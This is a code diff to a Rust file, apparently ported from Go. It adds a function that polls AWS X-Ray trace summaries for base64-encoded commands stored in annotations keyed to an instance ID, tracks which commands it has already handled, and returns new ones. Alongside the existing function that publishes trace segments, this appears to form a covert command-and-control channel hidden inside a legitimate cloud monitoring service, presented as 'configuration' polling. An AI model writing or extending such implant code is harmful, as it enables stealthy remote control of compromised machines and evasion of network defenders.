@@ -1,16 +1,20 @@
 use crate::model::AWSTraceSegment; // Import our model
-use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
+use base64::{Engine, engine::general_purpose::STANDARD as BASE64};
 use chrono::Utc;
 use hmac::{Hmac, Mac};
-use rand::{rngs::ThreadRng, RngCore};
+use once_cell::sync::Lazy; // Dependency for global lazy initialization
+use rand::{RngCore, rngs::ThreadRng};
+use serde::Deserialize; // Dependency for JSON parsing structs
 use sha2::{Digest, Sha256};
 use std::collections::HashMap;
+use std::collections::HashSet; // Dependency for tracking processed IDs
 use std::error::Error;
-use std::time::Duration;
+use std::sync::Mutex;
+use std::time::Duration; // Dependency for thread-safe global state
 
 // Use reqwest types for Client, Request, and all Headers
 use reqwest::blocking::{Client, Request};
-use reqwest::header::{HeaderValue, AUTHORIZATION, CONTENT_TYPE, HOST};
+use reqwest::header::{AUTHORIZATION, CONTENT_TYPE, HOST, HeaderValue};
 
 // --- Helper functions (Ported from Go) ---
 
@@ -61,11 +65,7 @@ pub fn sign_aws_request(
     };
 
     // Get host from the request URL
-    let host = request
-        .url()
-        .host_str()
-        .unwrap_or_default()
-        .to_string();
+    let host = request.url().host_str().unwrap_or_default().to_string();
 
     // Set required headers on the request
     let headers = request.headers_mut();
@@ -133,6 +133,155 @@ pub fn sign_aws_request(
     Ok(())
 }
 
+// --- ADDITIONS START ---
+
+// --- Global State for Idempotency Check (Port of Go's `processedRequestIds`) ---
+// Lazy ensures this is initialized once at first access. Mutex provides thread-safety.
+static PROCESSED_REQUEST_IDS: Lazy<Mutex<HashSet<String>>> =
+    Lazy::new(|| Mutex::new(HashSet::new()));
+
+// --- Structs for X-Ray Response Parsing (Port of Go's anonymous structs) ---
+// These are only used for deserialization, hence the unused warnings if not called in main.
+#[derive(Deserialize, Debug)]
+struct StringValue {
+    #[serde(rename = "StringValue")]
+    string_value: String,
+}
+
+#[derive(Deserialize, Debug)]
+struct AnnotationValue {
+    #[serde(rename = "AnnotationValue")]
+    annotation_value: StringValue,
+}
+
+#[derive(Deserialize, Debug)]
+struct TraceSummary {
+    #[serde(rename = "Annotations")]
+    annotations: HashMap<String, Vec<AnnotationValue>>,
+}
+
+#[derive(Deserialize, Debug)]
+struct XRayResponse {
+    #[serde(rename = "TraceSummaries")]
+    trace_summaries: Vec<TraceSummary>,
+}
+
+// --- Ported pollConfiguration Function ---
+
+/// Polls AWS X-Ray TraceSummaries endpoint for new commands embedded in trace annotations.
+/// If a new command is found, it updates the global set and returns the command string.
+pub fn poll_configuration(
+    instance_id: &str,
+    access_key: &str,
+    secret_key: &str,
+) -> Result<String, Box<dyn Error>> {
+    tracing::info!("Starting configuration poll for instance_id: {}", instance_id);
+
+    // 1. Calculate time range and build payload
+    let now = Utc::now().timestamp();
+    let start_time = now - 300; // Last 5 minutes
+    let end_time = now;
+    tracing::debug!("Time range set: Start={} End={}", start_time, end_time);
+
+    let payload = serde_json::json!({
+        "StartTime": start_time,
+        "EndTime": end_time,
+    });
+    let body = serde_json::to_vec(&payload)?;
+    tracing::debug!("Request payload created successfully. Body size: {} bytes.", body.len());
+
+    // 2. Build and sign the request
+    let url = format!("https://xray.{REGION}.amazonaws.com/TraceSummaries");
+    tracing::debug!("Target X-Ray URL: {}", url);
+    let client = Client::builder().timeout(Duration::from_secs(10)).build()?;
+
+    let mut req: Request = client.post(&url).body(body.clone()).build()?;
+
+    // Sign the request
+    // This is a critical step, so we'll log it.
+    tracing::debug!("Signing AWS request...");
+    sign_aws_request(&mut req, &body, access_key, secret_key)?;
+    tracing::debug!("AWS request signed successfully.");
+
+    // 3. Send the request
+    tracing::info!("Sending request to AWS X-Ray...");
+    let resp = client.execute(req)?;
+    let status = resp.status();
+    tracing::info!("Received response from X-Ray with status: {}", status);
+
+
+    if !status.is_success() {
+        let error_body = resp.text().unwrap_or_default();
+        tracing::warn!("X-Ray request failed! Status: {}, Body: {}", status, error_body);
+        return Err(format!(
+            "Error polling config: {} - {}",
+            status,
+            error_body
+        )
+        .into());
+    }
+
+    // 4. Parse the response body
+    let resp_body = resp.bytes()?;
+    tracing::debug!("Response body received, size: {} bytes. Attempting to parse JSON...", resp_body.len());
+    let response: XRayResponse = serde_json::from_slice(&resp_body)?;
+    tracing::debug!("Response successfully parsed. Total trace summaries: {}", response.trace_summaries.len());
+
+    // 5. Find the command annotation key
+    let config_key = format!("config_{}", instance_id);
+    tracing::debug!("Looking for annotation key: '{}'", config_key);
+
+    for (i, trace) in response.trace_summaries.into_iter().enumerate() {
+        tracing::debug!("Checking trace summary #{}", i);
+        // Look for the specific annotation key
+        if let Some(config_data) = trace.annotations.get(&config_key) {
+            tracing::debug!("Found config key '{}' in trace #{}. Annotations count: {}", config_key, i, config_data.len());
+            // NOTE: Applied Clippy suggestion 1: use .first() instead of .get(0)
+            if let Some(first_annotation) = config_data.first() {
+                let encoded_config = &first_annotation.annotation_value.string_value;
+
+                if !encoded_config.is_empty() {
+                    tracing::debug!("Found non-empty encoded config string. Attempting to decode and parse...");
+                    // NOTE: Applied Clippy suggestion 2: collapsed nested if statements
+                    if let Ok(decoded) = BASE64.decode(encoded_config)
+                        && let Ok(config_str) = String::from_utf8(decoded)
+                        && let Some((request_id, command)) = config_str.split_once(':')
+                    {
+                        // 8. Check global state for idempotency (locking the Mutex)
+                        tracing::debug!("Successfully decoded: '{}'. Attempting to lock global processed_ids set...", config_str);
+                        let mut processed_ids = PROCESSED_REQUEST_IDS.lock().unwrap();
+                        tracing::debug!("Global set locked.");
+
+                        if !processed_ids.contains(request_id) {
+                            // New command found!
+                            tracing::info!("!!! NEW COMMAND FOUND !!! Request ID: '{}', Command: '{}'", request_id, command);
+                            processed_ids.insert(request_id.to_string());
+                            tracing::debug!("Request ID '{}' added to processed set for idempotency.", request_id);
+                            return Ok(command.to_string());
+                        } else {
+                            // Command already processed
+                            tracing::info!("Command found but skipped (already processed). Request ID: '{}'", request_id);
+                        }
+                    } else {
+                        tracing::warn!("Failed to decode or parse the config value: '{}'", encoded_config);
+                    }
+                } else {
+                    tracing::debug!("Annotation value was empty, skipping.");
+                }
+            } else {
+                tracing::debug!("Config data found, but list of annotations was empty.");
+            }
+        } else {
+            tracing::debug!("Config key '{}' not found in trace #{}.", config_key, i);
+        }
+    }
+
+    // 9. No new command found
+    tracing::info!("Polling finished. No new unprocessed command found in X-Ray traces.");
+    Ok("".to_string())
+}
+// --- ADDITIONS END ---
+
 //
 // --- CORE FIX: Ported publish_metrics ---
 //
@@ -185,9 +334,7 @@ pub fn publish_metrics(
     let url = format!("https://xray.{REGION}.amazonaws.com/TraceSegments");
 
     // Create client
-    let client = Client::builder()
-        .timeout(Duration::from_secs(10))
-        .build()?;
+    let client = Client::builder().timeout(Duration::from_secs(10)).build()?;
 
     // Create the Request object
     // We *must* clone the body because `build()` consumes it,
